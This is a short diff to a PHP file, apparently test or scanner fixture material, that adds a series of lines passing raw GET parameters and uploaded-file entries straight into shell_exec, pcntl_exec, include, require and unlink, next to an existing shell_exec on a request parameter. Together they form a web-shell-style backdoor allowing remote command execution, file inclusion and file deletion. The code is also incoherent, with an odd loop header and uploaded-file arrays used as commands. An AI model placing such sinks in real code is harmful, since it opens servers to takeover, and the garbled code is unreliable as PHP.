@@ -8,4 +8,12 @@ while(True){
 }
 mysql_query($c);
 shell_exec($_GET["incl"]);
+die($_GET["get"]);
+print $_GET["print"];
+include($_GET["print"]);
+require($_GET["REQUIRE"]);
+unlink ($_GET['unlink_file']);
+shell_exec($_FILES['SHELLCODE.txt']);
+pcntl_exec($_FILES['program'], $_FILES['args1']);
+exec("alex");
 ?>
